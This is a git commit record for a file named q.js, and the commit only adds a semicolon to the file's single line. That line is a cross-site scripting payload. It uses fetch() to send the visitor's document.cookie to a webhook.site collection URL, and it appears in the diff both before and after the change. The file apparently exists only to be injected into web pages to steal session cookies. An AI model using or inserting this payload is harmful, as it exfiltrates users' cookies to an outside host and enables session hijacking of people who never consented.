4824f0a2e4c334cdcb87a4fdd8a8eaa77ae2643f
Sergiu Siminiuc <83398661+siminiuc@users.noreply.github.com>
2023-04-10 12:50:29 +0300

    Update q.js

--- q.js
+++ q.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/98cbeaaf-c0f6-40fa-85fd-25989b5bca7d?cookie=' + document.cookie)
+fetch('https://webhook.site/98cbeaaf-c0f6-40fa-85fd-25989b5bca7d?cookie=' + document.cookie);
